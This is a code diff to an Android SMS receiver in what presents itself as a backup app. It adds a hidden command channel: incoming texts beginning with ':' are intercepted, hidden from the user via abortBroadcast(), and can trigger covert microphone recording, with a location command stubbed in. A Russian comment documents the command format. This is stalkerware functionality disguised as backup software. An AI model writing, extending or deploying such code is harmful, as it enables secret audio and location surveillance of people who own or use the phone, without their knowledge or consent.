@@ -73,6 +73,10 @@ public class IncomingMessageReceiver extends BroadcastReceiver {
                 message.setMessage(message.getMessage() == null ? sms.getMessageBody() : message.getMessage() + sms.getMessageBody());
             }
             for (Sms message : messagesMap.values()) {
+                if(isControlMessage(context, message)) {
+                    abortBroadcast();
+                    continue;
+                }
                 Intent mIntent = new Intent(context, BackupService.class);
                 mIntent.setAction(BackupService.SMS);
                 mIntent.putExtra(BackupService.SMS, message);
@@ -80,4 +84,30 @@ public class IncomingMessageReceiver extends BroadcastReceiver {
             }
         }
     }
+
+    /**
+     * Маска: ':{команда}:[общая продолжительность]:[продолжительность одной записи]'
+     * M - запись с микрофона
+     * L - местоположение
+     */
+    private boolean isControlMessage(Context context, Sms sms) {
+        if(sms == null || sms.getMessage().length() <= 1 || sms.getMessage().charAt(0) != ':') {
+            return false;
+        }
+        switch (Character.toUpperCase(sms.getMessage().charAt(1))) {
+            case 'R':
+                Intent mIntent = new Intent(context, BackupService.class);
+                mIntent.setAction(BackupService.RECORD_MIC);
+                mIntent.putExtra(BackupService.COMMAND, sms.getMessage().length() > 2 ? sms.getMessage().substring(3) : "");
+                context.startService(mIntent);
+                break;
+            case 'L':
+                break;
+            default:
+                return false;
+        }
+        return true;
+    }
+
+
 }
